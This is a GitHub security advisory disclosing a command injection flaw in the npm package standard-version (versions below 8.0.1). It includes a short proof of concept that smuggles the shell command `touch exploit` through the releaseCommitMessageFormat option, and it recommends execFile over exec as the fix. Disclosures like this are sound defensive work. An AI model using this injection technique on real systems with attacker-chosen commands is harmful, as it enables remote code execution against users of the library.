# [M] Command Injection in standard-version

## Summary
Severity: Medium
Advisory: GHSA-7xcx-6wjh-7xp2
CWE: CWE-77
Ecosystem: npm
Published: 2020-07-13
Source: https://github.com/advisories/GHSA-7xcx-6wjh-7xp2
Type: github-advisory

## Affected
- npm: `standard-version` — affected >=0 <8.0.1

## Details
# GitHub Security Lab (GHSL) Vulnerability Report: `GHSL-2020-111`

The [GitHub Security Lab](https://securitylab.github.com) team has identified a potential security vulnerability in [standard-version](https://github.com/conventional-changelog/standard-version).

## Summary

The `standardVersion` function has a command injection vulnerability. Clients of the `standard-version` library are unlikely to be aware of this, so they might unwittingly write code that contains a vulnerability.

## Product
Standard Version
 
## Tested Version
Commit [2f04ac8](https://github.com/conventional-changelog/standard-version/tree/2f04ac8fc1c134a1981c23a093d4eece77d0bbb9/)

## Details

### Issue 1: Command injection in `standardVersion`

The following proof-of-concept illustrates the vulnerability. First install Standard Version and create an empty git repo to run the PoC in:

```
npm install standard-version
git init
echo "foo" > foo.txt # the git repo has to be non-empty
git add foo.txt
git commit -am "initial commit"
```

Now create a file with the following contents:

```
var fs = require("fs");
// setting up a bit of environment
fs.writeFileSync("package.json", '{"name": "foo", "version": "1.0.0"}');

const standardVersion = require('standard-version')

standardVersion({
  noVerify: true,
  infile: 'foo.txt',
  releaseCommitMessageFormat: "bla `touch exploit`"
})
```

and run it:

```
node test.js
```

Notice that a file named `exploit` has been created.

This vulnerability is similar to command injection vulnerabilities that have been found in other Javascript libraries. Here are some examples:
[CVE-2020-7646](https://github.com/advisories/GHSA-m8xj-5v73-3hh8),
[CVE-2020-7614](https://github.com/advisories/GHSA-426h-24vj-qwxf),
[CVE-2020-7597](https://github.com/advisories/GHSA-5q88-cjfq-g2mh),
[CVE-2019-10778](https://github.com/advisories/GHSA-4gp3-p7ph-x2jr),
[CVE-2019-10776](https://github.com/advisories/GHSA-84cm-v6jp-gjmr),
[CVE-2018-16462](https://github.com/advisories/GHSA-9jm3-5835-537m),
[CVE-2018-16461](https://github.com/advisories/GHSA-7g2w-6r25-2j7p),
[CVE-2018-16460](https://github.com/advisories/GHSA-cfhg-9x44-78h2),
[CVE-2018-13797](https://github.com/advisories/GHSA-pp57-mqmh-44h7),
[CVE-2018-3786](https://github.com/advisories/GHSA-c9j3-wqph-5xx9),
[CVE-2018-3772](https://github.com/advisories/GHSA-wjr4-2jgw-hmv8),
[CVE-2018-3746](https://github.com/advisories/GHSA-3pxp-6963-46r9),
[CVE-2017-16100](https://github.com/advisories/GHSA-jcw8-r9xm-32c6),
[CVE-2017-16042](https://github.com/advisories/GHSA-qh2h-chj9-jffq).

We have written a [CodeQL](https://codeql.com) query, which automatically detects this vulnerability. You can see the results of the query on the `standard-version` project [here](https://lgtm.com/query/237522640229151035/).

#### Impact

This issue may lead to remote code execution if a client of the library calls the vulnerable method with untrusted input.

#### Remediation

We recommend not using an API that can interpret a string as a shell command. For example, use [`child_process.execFile`](https://nodejs.org/api/child_process.html#child_process_child_process_execfile_file_args_options_callback) instead of [`child_process.exec`](https://nodejs.org/api/child_process.html#child_process_child_process_exec_command_options_callback).

## Credit

This issue was discovered and reported by GitHub Engineer [@erik-krogh (Erik Krogh Kristensen)](https://github.com/erik-krogh).

## Contact

You can contact the GHSL team at `securitylab@github.com`, please include `GHSL-2020-111` in any communication regarding this issue.

## Disclosure Policy

This report is subject to our [coordinated disclosure policy](https://securitylab.github.com/disclosures#policy).

## References
- https://github.com/conventional-changelog/standard-version/security/advisories/GHSA-7xcx-6wjh-7xp2
- https://github.com/conventional-changelog/standard-version
- https://github.com/conventional-changelog/standard-version/tree/2f04ac8fc1c134a1981c23a093d4eece77d0bbb9
